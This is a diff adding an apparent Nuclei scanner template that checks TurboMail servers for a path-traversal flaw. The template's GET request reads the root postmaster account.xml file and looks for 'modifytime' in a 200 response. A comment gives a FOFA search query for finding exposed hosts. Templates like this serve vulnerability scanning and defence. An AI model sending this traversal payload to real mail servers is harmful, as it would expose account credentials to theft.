@@ -1,0 +1,28 @@
+id: TurboMail-user-pass
+
+info:
+  name: TurboMail user pass
+  author: momika233
+  severity: high
+  description: TurboMail-user-pass
+  reference:
+    - https://github.com/momika233
+  tags: TurboMail
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "modifytime.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
+#fofa-query:"virtualRequest/sslvpn_login"
